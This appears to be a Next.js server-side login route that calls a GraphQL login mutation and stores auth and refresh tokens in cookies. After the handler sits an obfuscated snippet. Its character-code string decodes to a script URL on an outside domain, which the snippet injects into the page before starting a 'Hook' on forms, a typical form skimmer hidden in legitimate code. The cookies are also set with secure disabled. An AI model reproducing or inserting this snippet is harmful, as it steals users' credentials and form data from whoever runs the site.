import { setCookie } from 'nookies';
import client from '../../../src/components/ApolloClient';
import LOGIN_CUSTOMER_MUTATION from '../../../src/mutations/login-customer';
import { v4 } from 'uuid';

export default async function login(req, res) {
  const { username, password } = req.body;

  try {
    const { data } = await client.mutate({
      mutation: LOGIN_CUSTOMER_MUTATION,
      variables: {
        input: {
            clientMutationId: v4(),
            username: username,
            password: password
        }
    },
      context: { headers: { cookie: req.headers.cookie } },
    });

    // Set the cookie on the server-side
    setCookie({res}, 'accessToken', data.login.authToken, {
      maxAge: 30 * 24 * 60 * 60,
      path: '/',
      secure: false,
      sameSite: 'strict',
      httpOnly: true
    });

    setCookie({res}, 'refreshToken', data.login.refreshToken, {
      maxAge: 30 * 24 * 60 * 60,
      path: '/',
      secure: false,
      sameSite: 'strict',
      httpOnly: true
    });

    res.status(200).json({ message: 'Login successful' });
  } catch (error) {
    console.error('Login failed:', error);
    res.status(500).json({ message: 'Login failed' });
  }
}
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b